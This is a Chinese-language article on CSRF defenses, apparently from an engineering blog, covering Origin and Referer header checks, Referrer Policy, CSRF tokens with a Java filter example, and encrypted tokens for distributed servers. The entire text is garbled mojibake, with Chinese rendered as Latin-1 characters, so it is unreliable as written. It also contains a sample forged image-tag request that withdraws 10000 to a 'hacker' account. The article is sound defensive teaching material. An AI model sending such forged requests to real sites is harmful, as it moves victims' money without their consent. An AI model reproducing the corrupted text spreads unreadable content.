åŒæºæ£€æµ‹æ—¢ç„¶CSRFå¤§å¤šæ¥è‡ªç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç›´æ¥ç¦æ­¢å¤–åŸŸï¼ˆæˆ–è€…ä¸å—ä¿¡ä»»çš„åŸŸåï¼‰å¯¹æˆ‘ä»¬å‘èµ·è¯·æ±‚ã€‚ é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬å¦‚ä½•åˆ¤æ–­è¯·æ±‚æ˜¯å¦æ¥è‡ªå¤–åŸŸå‘¢ï¼Ÿ åœ¨HTTPåè®®ä¸­ï¼Œæ¯ä¸€ä¸ªå¼‚æ­¥è¯·æ±‚éƒ½ä¼šæºå¸¦ä¸¤ä¸ªHeaderï¼Œç”¨äºæ ‡è®°æ¥æºåŸŸåï¼š Origin Header Referer Header è¿™ä¸¤ä¸ªHeaderåœ¨æµè§ˆå™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œå¤§å¤šæ•°æƒ…å†µä¼šè‡ªåŠ¨å¸¦ä¸Šï¼Œå¹¶ä¸”ä¸èƒ½ç”±å‰ç«¯è‡ªå®šä¹‰å†…å®¹ã€‚ æœåŠ¡å™¨å¯ä»¥é€šè¿‡è§£æè¿™ä¸¤ä¸ªHeaderä¸­çš„åŸŸåï¼Œç¡®å®šè¯·æ±‚çš„æ¥æºåŸŸã€‚ ä½¿ç”¨Origin Headerç¡®å®šæ¥æºåŸŸååœ¨éƒ¨åˆ†ä¸CSRFæœ‰å…³çš„è¯·æ±‚ä¸­ï¼Œè¯·æ±‚çš„Headerä¸­ä¼šæºå¸¦Originå­—æ®µã€‚å­—æ®µå†…åŒ…å«è¯·æ±‚çš„åŸŸåï¼ˆä¸åŒ…å«pathåŠqueryï¼‰ã€‚ å¦‚æœOriginå­˜åœ¨ï¼Œé‚£ä¹ˆç›´æ¥ä½¿ç”¨Originä¸­çš„å­—æ®µç¡®è®¤æ¥æºåŸŸåå°±å¯ä»¥ã€‚ ä½†æ˜¯Originåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹å¹¶ä¸å­˜åœ¨ï¼š IE11åŒæºç­–ç•¥ï¼š IE 11 ä¸ä¼šåœ¨è·¨ç«™CORSè¯·æ±‚ä¸Šæ·»åŠ Originæ ‡å¤´ï¼ŒRefererå¤´å°†ä»ç„¶æ˜¯å”¯ä¸€çš„æ ‡è¯†ã€‚æœ€æ ¹æœ¬åŸå› æ˜¯å› ä¸ºIE 11å¯¹åŒæºçš„å®šä¹‰å’Œå…¶ä»–æµè§ˆå™¨æœ‰ä¸åŒï¼Œæœ‰ä¸¤ä¸ªä¸»è¦çš„åŒºåˆ«ï¼Œå¯ä»¥å‚è€ƒMDN Same-origin_policy#IE_Exceptions 302é‡å®šå‘ï¼š åœ¨302é‡å®šå‘ä¹‹åOriginä¸åŒ…å«åœ¨é‡å®šå‘çš„è¯·æ±‚ä¸­ï¼Œå› ä¸ºOriginå¯èƒ½ä¼šè¢«è®¤ä¸ºæ˜¯å…¶ä»–æ¥æºçš„æ•æ„Ÿä¿¡æ¯ã€‚å¯¹äº302é‡å®šå‘çš„æƒ…å†µæ¥è¯´éƒ½æ˜¯å®šå‘åˆ°æ–°çš„æœåŠ¡å™¨ä¸Šçš„URLï¼Œå› æ­¤æµè§ˆå™¨ä¸æƒ³å°†Originæ³„æ¼åˆ°æ–°çš„æœåŠ¡å™¨ä¸Šã€‚ ä½¿ç”¨Referer Headerç¡®å®šæ¥æºåŸŸåæ ¹æ®HTTPåè®®ï¼Œåœ¨HTTPå¤´ä¸­æœ‰ä¸€ä¸ªå­—æ®µå«Refererï¼Œè®°å½•äº†è¯¥HTTPè¯·æ±‚çš„æ¥æºåœ°å€ã€‚ å¯¹äºAjaxè¯·æ±‚ï¼Œå›¾ç‰‡å’Œscriptç­‰èµ„æºè¯·æ±‚ï¼ŒRefererä¸ºå‘èµ·è¯·æ±‚çš„é¡µé¢åœ°å€ã€‚å¯¹äºé¡µé¢è·³è½¬ï¼ŒRefererä¸ºæ‰“å¼€é¡µé¢å†å²è®°å½•çš„å‰ä¸€ä¸ªé¡µé¢åœ°å€ã€‚å› æ­¤æˆ‘ä»¬ä½¿ç”¨Refererä¸­é“¾æ¥çš„Originéƒ¨åˆ†å¯ä»¥å¾—çŸ¥è¯·æ±‚çš„æ¥æºåŸŸåã€‚ è¿™ç§æ–¹æ³•å¹¶éä¸‡æ— ä¸€å¤±ï¼ŒRefererçš„å€¼æ˜¯ç”±æµè§ˆå™¨æä¾›çš„ï¼Œè™½ç„¶HTTPåè®®ä¸Šæœ‰æ˜ç¡®çš„è¦æ±‚ï¼Œä½†æ˜¯æ¯ä¸ªæµè§ˆå™¨å¯¹äºRefererçš„å…·ä½“å®ç°å¯èƒ½æœ‰å·®åˆ«ï¼Œå¹¶ä¸èƒ½ä¿è¯æµè§ˆå™¨è‡ªèº«æ²¡æœ‰å®‰å…¨æ¼æ´ã€‚ä½¿ç”¨éªŒè¯ Referer å€¼çš„æ–¹æ³•ï¼Œå°±æ˜¯æŠŠå®‰å…¨æ€§éƒ½ä¾èµ–äºç¬¬ä¸‰æ–¹ï¼ˆå³æµè§ˆå™¨ï¼‰æ¥ä¿éšœï¼Œä»ç†è®ºä¸Šæ¥è®²ï¼Œè¿™æ ·å¹¶ä¸æ˜¯å¾ˆå®‰å…¨ã€‚åœ¨éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥éšè—ï¼Œç”šè‡³ä¿®æ”¹è‡ªå·±è¯·æ±‚çš„Refererã€‚ 2014å¹´ï¼ŒW3Cçš„Webåº”ç”¨å®‰å…¨å·¥ä½œç»„å‘å¸ƒäº†Referrer Policyè‰æ¡ˆï¼Œå¯¹æµè§ˆå™¨è¯¥å¦‚ä½•å‘é€Refereråšäº†è¯¦ç»†çš„è§„å®šã€‚æˆªæ­¢ç°åœ¨æ–°ç‰ˆæµè§ˆå™¨å¤§éƒ¨åˆ†å·²ç»æ”¯æŒäº†è¿™ä»½è‰æ¡ˆï¼Œæˆ‘ä»¬ç»ˆäºå¯ä»¥çµæ´»åœ°æ§åˆ¶è‡ªå·±ç½‘ç«™çš„Refererç­–ç•¥äº†ã€‚æ–°ç‰ˆçš„Referrer Policyè§„å®šäº†äº”ç§Refererç­–ç•¥ï¼šNo Referrerã€No Referrer When Downgradeã€Origin Onlyã€Origin When Cross-originã€å’Œ Unsafe URLã€‚ä¹‹å‰å°±å­˜åœ¨çš„ä¸‰ç§ç­–ç•¥ï¼šneverã€defaultå’Œalwaysï¼Œåœ¨æ–°æ ‡å‡†é‡Œæ¢äº†ä¸ªåç§°ã€‚ä»–ä»¬çš„å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š ç­–ç•¥åç§° å±æ€§å€¼ï¼ˆæ–°ï¼‰ å±æ€§å€¼ï¼ˆæ—§ï¼‰ No Referrer no-Referrer never No Referrer When Downgrade no-Referrer-when-downgrade default Origin Only (same or strict) origin origin Origin When Cross Origin (strict) origin-when-crossorigin - Unsafe URL unsafe-url always æ ¹æ®ä¸Šé¢çš„è¡¨æ ¼å› æ­¤éœ€è¦æŠŠReferrer Policyçš„ç­–ç•¥è®¾ç½®æˆsame-originï¼Œå¯¹äºåŒæºçš„é“¾æ¥å’Œå¼•ç”¨ï¼Œä¼šå‘é€Refererï¼Œrefererå€¼ä¸ºHostä¸å¸¦Pathï¼›è·¨åŸŸè®¿é—®åˆ™ä¸æºå¸¦Refererã€‚ä¾‹å¦‚ï¼šaaa.comå¼•ç”¨bbb.comçš„èµ„æºï¼Œä¸ä¼šå‘é€Refererã€‚ è®¾ç½®Referrer Policyçš„æ–¹æ³•æœ‰ä¸‰ç§ï¼š åœ¨CSPè®¾ç½® é¡µé¢å¤´éƒ¨å¢åŠ metaæ ‡ç­¾ aæ ‡ç­¾å¢åŠ referrerpolicyå±æ€§ ä¸Šé¢è¯´çš„è¿™äº›æ¯”è¾ƒå¤šï¼Œä½†æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸ªé—®é¢˜ï¼šæ”»å‡»è€…å¯ä»¥åœ¨è‡ªå·±çš„è¯·æ±‚ä¸­éšè—Refererã€‚å¦‚æœæ”»å‡»è€…å°†è‡ªå·±çš„è¯·æ±‚è¿™æ ·å¡«å†™ï¼š 1![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker) é‚£ä¹ˆè¿™ä¸ªè¯·æ±‚å‘èµ·çš„æ”»å‡»å°†ä¸æºå¸¦Refererã€‚ å¦å¤–åœ¨ä»¥ä¸‹æƒ…å†µä¸‹Refereræ²¡æœ‰æˆ–è€…ä¸å¯ä¿¡ï¼š IE6ã€7ä¸‹ä½¿ç”¨window.location.href=urlè¿›è¡Œç•Œé¢çš„è·³è½¬ï¼Œä¼šä¸¢å¤±Refererã€‚ IE6ã€7ä¸‹ä½¿ç”¨window.openï¼Œä¹Ÿä¼šç¼ºå¤±Refererã€‚ HTTPSé¡µé¢è·³è½¬åˆ°HTTPé¡µé¢ï¼Œæ‰€æœ‰æµè§ˆå™¨Refereréƒ½ä¸¢å¤±ã€‚ ç‚¹å‡»Flashä¸Šåˆ°è¾¾å¦å¤–ä¸€ä¸ªç½‘ç«™çš„æ—¶å€™ï¼ŒRefererçš„æƒ…å†µå°±æ¯”è¾ƒæ‚ä¹±ï¼Œä¸å¤ªå¯ä¿¡ã€‚ æ— æ³•ç¡®è®¤æ¥æºåŸŸåæƒ…å†µå½“Originå’ŒRefererå¤´æ–‡ä»¶ä¸å­˜åœ¨æ—¶è¯¥æ€ä¹ˆåŠï¼Ÿå¦‚æœOriginå’ŒRefereréƒ½ä¸å­˜åœ¨ï¼Œå»ºè®®ç›´æ¥è¿›è¡Œé˜»æ­¢ï¼Œç‰¹åˆ«æ˜¯å¦‚æœæ‚¨æ²¡æœ‰ä½¿ç”¨éšæœºCSRF Tokenï¼ˆå‚è€ƒä¸‹æ–¹ï¼‰ä½œä¸ºç¬¬äºŒæ¬¡æ£€æŸ¥ã€‚ å¦‚ä½•é˜»æ­¢å¤–åŸŸè¯·æ±‚é€šè¿‡Headerçš„éªŒè¯ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å‘èµ·è¯·æ±‚çš„æ¥æºåŸŸåï¼Œè¿™äº›æ¥æºåŸŸåå¯èƒ½æ˜¯ç½‘ç«™æœ¬åŸŸï¼Œæˆ–è€…å­åŸŸåï¼Œæˆ–è€…æœ‰æˆæƒçš„ç¬¬ä¸‰æ–¹åŸŸåï¼Œåˆæˆ–è€…æ¥è‡ªä¸å¯ä¿¡çš„æœªçŸ¥åŸŸåã€‚ æˆ‘ä»¬å·²ç»çŸ¥é“äº†è¯·æ±‚åŸŸåæ˜¯å¦æ˜¯æ¥è‡ªä¸å¯ä¿¡çš„åŸŸåï¼Œæˆ‘ä»¬ç›´æ¥é˜»æ­¢æ‰è¿™äº›çš„è¯·æ±‚ï¼Œå°±èƒ½é˜²å¾¡CSRFæ”»å‡»äº†å—ï¼Ÿ ä¸”æ…¢ï¼å½“ä¸€ä¸ªè¯·æ±‚æ˜¯é¡µé¢è¯·æ±‚ï¼ˆæ¯”å¦‚ç½‘ç«™çš„ä¸»é¡µï¼‰ï¼Œè€Œæ¥æºæ˜¯æœç´¢å¼•æ“çš„é“¾æ¥ï¼ˆä¾‹å¦‚ç™¾åº¦çš„æœç´¢ç»“æœï¼‰ï¼Œä¹Ÿä¼šè¢«å½“æˆç–‘ä¼¼CSRFæ”»å‡»ã€‚æ‰€ä»¥åœ¨åˆ¤æ–­çš„æ—¶å€™éœ€è¦è¿‡æ»¤æ‰é¡µé¢è¯·æ±‚æƒ…å†µï¼Œé€šå¸¸Headerç¬¦åˆä»¥ä¸‹æƒ…å†µï¼š 12Accept: text/htmlMethod: GET ä½†ç›¸åº”çš„ï¼Œé¡µé¢è¯·æ±‚å°±æš´éœ²åœ¨äº†CSRFçš„æ”»å‡»èŒƒå›´ä¹‹ä¸­ã€‚å¦‚æœä½ çš„ç½‘ç«™ä¸­ï¼Œåœ¨é¡µé¢çš„GETè¯·æ±‚ä¸­å¯¹å½“å‰ç”¨æˆ·åšäº†ä»€ä¹ˆæ“ä½œçš„è¯ï¼Œé˜²èŒƒå°±å¤±æ•ˆäº†ã€‚ ä¾‹å¦‚ï¼Œä¸‹é¢çš„é¡µé¢è¯·æ±‚ï¼š 1GET https://example.com/addComment?comment=XXX&amp;dest=orderId æ³¨ï¼šè¿™ç§ä¸¥æ ¼æ¥è¯´å¹¶ä¸ä¸€å®šå­˜åœ¨CSRFæ”»å‡»çš„é£é™©ï¼Œä½†ä»ç„¶æœ‰å¾ˆå¤šç½‘ç«™ç»å¸¸æŠŠä¸»æ–‡æ¡£GETè¯·æ±‚æŒ‚ä¸Šå‚æ•°æ¥å®ç°äº§å“åŠŸèƒ½ï¼Œä½†æ˜¯è¿™æ ·åšå¯¹äºè‡ªèº«æ¥è¯´æ˜¯å­˜åœ¨å®‰å…¨é£é™©çš„ã€‚ å¦å¤–ï¼Œå‰é¢è¯´è¿‡ï¼ŒCSRFå¤§å¤šæ•°æƒ…å†µä¸‹æ¥è‡ªç¬¬ä¸‰æ–¹åŸŸåï¼Œä½†å¹¶ä¸èƒ½æ’é™¤æœ¬åŸŸå‘èµ·ã€‚å¦‚æœæ”»å‡»è€…æœ‰æƒé™åœ¨æœ¬åŸŸå‘å¸ƒè¯„è®ºï¼ˆå«é“¾æ¥ã€å›¾ç‰‡ç­‰ï¼Œç»Ÿç§°UGCï¼‰ï¼Œé‚£ä¹ˆå®ƒå¯ä»¥ç›´æ¥åœ¨æœ¬åŸŸå‘èµ·æ”»å‡»ï¼Œè¿™ç§æƒ…å†µä¸‹åŒæºç­–ç•¥æ— æ³•è¾¾åˆ°é˜²æŠ¤çš„ä½œç”¨ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼šåŒæºéªŒè¯æ˜¯ä¸€ä¸ªç›¸å¯¹ç®€å•çš„é˜²èŒƒæ–¹æ³•ï¼Œèƒ½å¤Ÿé˜²èŒƒç»å¤§å¤šæ•°çš„CSRFæ”»å‡»ã€‚ä½†è¿™å¹¶ä¸æ˜¯ä¸‡æ— ä¸€å¤±çš„ï¼Œå¯¹äºå®‰å…¨æ€§è¦æ±‚è¾ƒé«˜ï¼Œæˆ–è€…æœ‰è¾ƒå¤šç”¨æˆ·è¾“å…¥å†…å®¹çš„ç½‘ç«™ï¼Œæˆ‘ä»¬å°±è¦å¯¹å…³é”®çš„æ¥å£åšé¢å¤–çš„é˜²æŠ¤æªæ–½ã€‚ CSRF Tokenå‰é¢è®²åˆ°CSRFçš„å¦ä¸€ä¸ªç‰¹å¾æ˜¯ï¼Œæ”»å‡»è€…æ— æ³•ç›´æ¥çªƒå–åˆ°ç”¨æˆ·çš„ä¿¡æ¯ï¼ˆCookieï¼ŒHeaderï¼Œç½‘ç«™å†…å®¹ç­‰ï¼‰ï¼Œä»…ä»…æ˜¯å†’ç”¨Cookieä¸­çš„ä¿¡æ¯ã€‚ è€ŒCSRFæ”»å‡»ä¹‹æ‰€ä»¥èƒ½å¤ŸæˆåŠŸï¼Œæ˜¯å› ä¸ºæœåŠ¡å™¨è¯¯æŠŠæ”»å‡»è€…å‘é€çš„è¯·æ±‚å½“æˆäº†ç”¨æˆ·è‡ªå·±çš„è¯·æ±‚ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¦æ±‚æ‰€æœ‰çš„ç”¨æˆ·è¯·æ±‚éƒ½æºå¸¦ä¸€ä¸ªCSRFæ”»å‡»è€…æ— æ³•è·å–åˆ°çš„Tokenã€‚æœåŠ¡å™¨é€šè¿‡æ ¡éªŒè¯·æ±‚æ˜¯å¦æºå¸¦æ­£ç¡®çš„Tokenï¼Œæ¥æŠŠæ­£å¸¸çš„è¯·æ±‚å’Œæ”»å‡»çš„è¯·æ±‚åŒºåˆ†å¼€ï¼Œä¹Ÿå¯ä»¥é˜²èŒƒCSRFçš„æ”»å‡»ã€‚ åŸç†CSRF Tokençš„é˜²æŠ¤ç­–ç•¥åˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼š 1. å°†CSRF Tokenè¾“å‡ºåˆ°é¡µé¢ä¸­ é¦–å…ˆï¼Œç”¨æˆ·æ‰“å¼€é¡µé¢çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨éœ€è¦ç»™è¿™ä¸ªç”¨æˆ·ç”Ÿæˆä¸€ä¸ªTokenï¼Œè¯¥Tokené€šè¿‡åŠ å¯†ç®—æ³•å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œä¸€èˆ¬Tokenéƒ½åŒ…æ‹¬éšæœºå­—ç¬¦ä¸²å’Œæ—¶é—´æˆ³çš„ç»„åˆï¼Œæ˜¾ç„¶åœ¨æäº¤æ—¶Tokenä¸èƒ½å†æ”¾åœ¨Cookieä¸­äº†ï¼Œå¦åˆ™åˆä¼šè¢«æ”»å‡»è€…å†’ç”¨ã€‚å› æ­¤ï¼Œä¸ºäº†å®‰å…¨èµ·è§Tokenæœ€å¥½è¿˜æ˜¯å­˜åœ¨æœåŠ¡å™¨çš„Sessionä¸­ï¼Œä¹‹ååœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶ï¼Œä½¿ç”¨JSéå†æ•´ä¸ªDOMæ ‘ï¼Œå¯¹äºDOMä¸­æ‰€æœ‰çš„aå’Œformæ ‡ç­¾ååŠ å…¥Tokenã€‚è¿™æ ·å¯ä»¥è§£å†³å¤§éƒ¨åˆ†çš„è¯·æ±‚ï¼Œä½†æ˜¯å¯¹äºåœ¨é¡µé¢åŠ è½½ä¹‹ååŠ¨æ€ç”Ÿæˆçš„HTMLä»£ç ï¼Œè¿™ç§æ–¹æ³•å°±æ²¡æœ‰ä½œç”¨ï¼Œè¿˜éœ€è¦ç¨‹åºå‘˜åœ¨ç¼–ç æ—¶æ‰‹åŠ¨æ·»åŠ Tokenã€‚ 2. é¡µé¢æäº¤çš„è¯·æ±‚æºå¸¦è¿™ä¸ªToken å¯¹äºGETè¯·æ±‚ï¼ŒTokenå°†é™„åœ¨è¯·æ±‚åœ°å€ä¹‹åï¼Œè¿™æ ·URL å°±å˜æˆ http://url?csrftoken=tokenvalueã€‚ è€Œå¯¹äº POST è¯·æ±‚æ¥è¯´ï¼Œè¦åœ¨ form çš„æœ€ååŠ ä¸Šï¼š 1&lt;input type=â€hiddenâ€ name=â€csrftokenâ€ value=â€tokenvalueâ€/&gt; è¿™æ ·ï¼Œå°±æŠŠTokenä»¥å‚æ•°çš„å½¢å¼åŠ å…¥è¯·æ±‚äº†ã€‚ 3. æœåŠ¡å™¨éªŒè¯Tokenæ˜¯å¦æ­£ç¡® å½“ç”¨æˆ·ä»å®¢æˆ·ç«¯å¾—åˆ°äº†Tokenï¼Œå†æ¬¡æäº¤ç»™æœåŠ¡å™¨çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨éœ€è¦åˆ¤æ–­Tokençš„æœ‰æ•ˆæ€§ï¼ŒéªŒè¯è¿‡ç¨‹æ˜¯å…ˆè§£å¯†Tokenï¼Œå¯¹æ¯”åŠ å¯†å­—ç¬¦ä¸²ä»¥åŠæ—¶é—´æˆ³ï¼Œå¦‚æœåŠ å¯†å­—ç¬¦ä¸²ä¸€è‡´ä¸”æ—¶é—´æœªè¿‡æœŸï¼Œé‚£ä¹ˆè¿™ä¸ªTokenå°±æ˜¯æœ‰æ•ˆçš„ã€‚ è¿™ç§æ–¹æ³•è¦æ¯”ä¹‹å‰æ£€æŸ¥Refereræˆ–è€…Originè¦å®‰å…¨ä¸€äº›ï¼ŒTokenå¯ä»¥åœ¨äº§ç”Ÿå¹¶æ”¾äºSessionä¹‹ä¸­ï¼Œç„¶ååœ¨æ¯æ¬¡è¯·æ±‚æ—¶æŠŠTokenä»Sessionä¸­æ‹¿å‡ºï¼Œä¸è¯·æ±‚ä¸­çš„Tokenè¿›è¡Œæ¯”å¯¹ï¼Œä½†è¿™ç§æ–¹æ³•çš„æ¯”è¾ƒéº»çƒ¦çš„åœ¨äºå¦‚ä½•æŠŠTokenä»¥å‚æ•°çš„å½¢å¼åŠ å…¥è¯·æ±‚ã€‚ ä¸‹é¢å°†ä»¥Javaä¸ºä¾‹ï¼Œä»‹ç»ä¸€äº›CSRF Tokençš„æœåŠ¡ç«¯æ ¡éªŒé€»è¾‘ï¼Œä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223HttpServletRequest req = (HttpServletRequest)request; HttpSession s = req.getSession(); // ä» session ä¸­å¾—åˆ° csrftoken å±æ€§String sToken = (String)s.getAttribute(â€œcsrftokenâ€); if(sToken == null)&#123; // äº§ç”Ÿæ–°çš„ token æ”¾å…¥ session ä¸­ sToken = generateToken(); s.setAttribute(â€œcsrftokenâ€,sToken); chain.doFilter(request, response); &#125; else&#123; // ä» HTTP å¤´ä¸­å–å¾— csrftoken String xhrToken = req.getHeader(â€œcsrftokenâ€); // ä»è¯·æ±‚å‚æ•°ä¸­å–å¾— csrftoken String pToken = req.getParameter(â€œcsrftokenâ€); if(sToken != null &amp;&amp; xhrToken != null &amp;&amp; sToken.equals(xhrToken))&#123; chain.doFilter(request, response); &#125;else if(sToken != null &amp;&amp; pToken != null &amp;&amp; sToken.equals(pToken))&#123; chain.doFilter(request, response); &#125;else&#123; request.getRequestDispatcher(â€œerror.jspâ€).forward(request,response); &#125; &#125; ä»£ç æºè‡ªIBM developerworks CSRF è¿™ä¸ªTokençš„å€¼å¿…é¡»æ˜¯éšæœºç”Ÿæˆçš„ï¼Œè¿™æ ·å®ƒå°±ä¸ä¼šè¢«æ”»å‡»è€…çŒœåˆ°ï¼Œè€ƒè™‘åˆ©ç”¨Javaåº”ç”¨ç¨‹åºçš„java.security.SecureRandomç±»æ¥ç”Ÿæˆè¶³å¤Ÿé•¿çš„éšæœºæ ‡è®°ï¼Œæ›¿ä»£ç”Ÿæˆç®—æ³•åŒ…æ‹¬ä½¿ç”¨256ä½BASE64ç¼–ç å“ˆå¸Œï¼Œé€‰æ‹©è¿™ç§ç”Ÿæˆç®—æ³•çš„å¼€å‘äººå‘˜å¿…é¡»ç¡®ä¿åœ¨æ•£åˆ—æ•°æ®ä¸­ä½¿ç”¨éšæœºæ€§å’Œå”¯ä¸€æ€§æ¥ç”Ÿæˆéšæœºæ ‡è¯†ã€‚é€šå¸¸ï¼Œå¼€å‘äººå‘˜åªéœ€ä¸ºå½“å‰ä¼šè¯ç”Ÿæˆä¸€æ¬¡Tokenã€‚åœ¨åˆå§‹ç”Ÿæˆæ­¤Tokenä¹‹åï¼Œè¯¥å€¼å°†å­˜å‚¨åœ¨ä¼šè¯ä¸­ï¼Œå¹¶ç”¨äºæ¯ä¸ªåç»­è¯·æ±‚ï¼Œç›´åˆ°ä¼šè¯è¿‡æœŸã€‚å½“æœ€ç»ˆç”¨æˆ·å‘å‡ºè¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç«¯å¿…é¡»éªŒè¯è¯·æ±‚ä¸­Tokençš„å­˜åœ¨æ€§å’Œæœ‰æ•ˆæ€§ï¼Œä¸ä¼šè¯ä¸­æ‰¾åˆ°çš„Tokenç›¸æ¯”è¾ƒã€‚å¦‚æœåœ¨è¯·æ±‚ä¸­æ‰¾ä¸åˆ°Tokenï¼Œæˆ–è€…æä¾›çš„å€¼ä¸ä¼šè¯ä¸­çš„å€¼ä¸åŒ¹é…ï¼Œåˆ™åº”ä¸­æ­¢è¯·æ±‚ï¼Œåº”é‡ç½®Tokenå¹¶å°†äº‹ä»¶è®°å½•ä¸ºæ­£åœ¨è¿›è¡Œçš„æ½œåœ¨CSRFæ”»å‡»ã€‚ åˆ†å¸ƒå¼æ ¡éªŒåœ¨å¤§å‹ç½‘ç«™ä¸­ï¼Œä½¿ç”¨Sessionå­˜å‚¨CSRF Tokenä¼šå¸¦æ¥å¾ˆå¤§çš„å‹åŠ›ã€‚è®¿é—®å•å°æœåŠ¡å™¨sessionæ˜¯åŒä¸€ä¸ªã€‚ä½†æ˜¯ç°åœ¨çš„å¤§å‹ç½‘ç«™ä¸­ï¼Œæˆ‘ä»¬çš„æœåŠ¡å™¨é€šå¸¸ä¸æ­¢ä¸€å°ï¼Œå¯èƒ½æ˜¯å‡ åå°ç”šè‡³å‡ ç™¾å°ä¹‹å¤šï¼Œç”šè‡³å¤šä¸ªæœºæˆ¿éƒ½å¯èƒ½åœ¨ä¸åŒçš„çœä»½ï¼Œç”¨æˆ·å‘èµ·çš„HTTPè¯·æ±‚é€šå¸¸è¦ç»è¿‡åƒNgnixä¹‹ç±»çš„è´Ÿè½½å‡è¡¡å™¨ä¹‹åï¼Œå†è·¯ç”±åˆ°å…·ä½“çš„æœåŠ¡å™¨ä¸Šï¼Œç”±äºSessioné»˜è®¤å­˜å‚¨åœ¨å•æœºæœåŠ¡å™¨å†…å­˜ä¸­ï¼Œå› æ­¤åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹åŒä¸€ä¸ªç”¨æˆ·å‘é€çš„å¤šæ¬¡HTTPè¯·æ±‚å¯èƒ½ä¼šå…ˆåè½åˆ°ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œå¯¼è‡´åé¢å‘èµ·çš„HTTPè¯·æ±‚æ— æ³•æ‹¿åˆ°ä¹‹å‰çš„HTTPè¯·æ±‚å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„Sessionæ•°æ®ï¼Œä»è€Œä½¿å¾—Sessionæœºåˆ¶åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹å¤±æ•ˆï¼Œå› æ­¤åœ¨åˆ†å¸ƒå¼é›†ç¾¤ä¸­CSRF Tokenéœ€è¦å­˜å‚¨åœ¨Redisä¹‹ç±»çš„å…¬å…±å­˜å‚¨ç©ºé—´ã€‚ ç”±äºä½¿ç”¨Sessionå­˜å‚¨ï¼Œè¯»å–å’ŒéªŒè¯CSRF Tokenä¼šå¼•èµ·æ¯”è¾ƒå¤§çš„å¤æ‚åº¦å’Œæ€§èƒ½é—®é¢˜ï¼Œç›®å‰å¾ˆå¤šç½‘ç«™é‡‡ç”¨Encrypted Token Patternæ–¹å¼ã€‚è¿™ç§æ–¹æ³•çš„Tokenæ˜¯ä¸€ä¸ªè®¡ç®—å‡ºæ¥çš„ç»“æœï¼Œè€Œééšæœºç”Ÿæˆçš„å­—ç¬¦ä¸²ã€‚è¿™æ ·åœ¨æ ¡éªŒæ—¶æ— éœ€å†å»è¯»å–å­˜å‚¨çš„Tokenï¼Œåªç”¨å†æ¬¡è®¡ç®—ä¸€æ¬¡å³å¯ã€‚ è¿™ç§Tokençš„å€¼é€šå¸¸æ˜¯ä½¿ç”¨UserIDã€æ—¶é—´æˆ³å’Œéšæœºæ•°ï¼Œé€šè¿‡åŠ å¯†çš„æ–¹æ³•ç”Ÿæˆã€‚è¿™æ ·æ—¢å¯ä»¥ä¿è¯åˆ†å¸ƒå¼æœåŠ¡çš„Tokenä¸€è‡´ï¼Œåˆèƒ½ä¿è¯Tokenä¸å®¹æ˜“è¢«ç ´è§£ã€‚ åœ¨tokenè§£å¯†æˆåŠŸä¹‹åï¼ŒæœåŠ¡å™¨å¯ä»¥è®¿é—®è§£æå€¼ï¼ŒTokenä¸­åŒ…å«çš„UserIDå’Œæ—¶é—´æˆ³å°†ä¼šè¢«æ‹¿æ¥è¢«éªŒè¯æœ‰æ•ˆæ€§ï¼Œå°†UserIDä¸å½“å‰ç™»å½•çš„UserIDè¿›è¡Œæ¯”è¾ƒï¼Œå¹¶å°†æ—¶é—´æˆ³ä¸å½“å‰æ—¶é—´è¿›è¡Œæ¯”è¾ƒã€‚ æ€»ç»“Tokenæ˜¯ä¸€ä¸ªæ¯”è¾ƒæœ‰æ•ˆçš„CSRFé˜²æŠ¤æ–¹æ³•ï¼Œåªè¦é¡µé¢æ²¡æœ‰XSSæ¼æ´æ³„éœ²Tokenï¼Œé‚£ä¹ˆæ¥å£çš„CSRFæ”»å‡»å°±æ— æ³•æˆåŠŸã€‚ ä½†æ˜¯æ­¤æ–¹æ³•çš„å®ç°æ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦ç»™æ¯ä¸€ä¸ªé¡µé¢éƒ½å†™å…¥Tokenï¼ˆå‰ç«¯æ— æ³•ä½¿ç”¨çº¯é™æ€é¡µé¢ï¼‰ï¼Œæ¯ä¸€ä¸ªFormåŠAjaxè¯·æ±‚éƒ½æºå¸¦è¿™ä¸ªTokenï¼Œåç«¯å¯¹æ¯ä¸€ä¸ªæ¥å£éƒ½è¿›è¡Œæ ¡éªŒï¼Œå¹¶ä¿è¯é¡µé¢TokenåŠè¯·æ±‚Tokenä¸€è‡´ã€‚è¿™å°±ä½¿å¾—è¿™ä¸ªé˜²æŠ¤ç­–ç•¥ä¸èƒ½åœ¨é€šç”¨çš„æ‹¦æˆªä¸Šç»Ÿä¸€æ‹¦æˆªå¤„ç†ï¼Œè€Œéœ€è¦æ¯ä¸€ä¸ªé¡µé¢å’Œæ¥å£éƒ½æ·»åŠ å¯¹åº”çš„è¾“å‡ºå’Œæ ¡éªŒã€‚è¿™ç§æ–¹æ³•å·¥ä½œé‡å·¨å¤§ï¼Œä¸”æœ‰å¯èƒ½é—æ¼ã€‚ éªŒè¯ç å’Œå¯†ç å…¶å®ä¹Ÿå¯ä»¥èµ·åˆ°CSRF Tokençš„ä½œç”¨å“¦ï¼Œè€Œä¸”æ›´å®‰å…¨ã€‚ 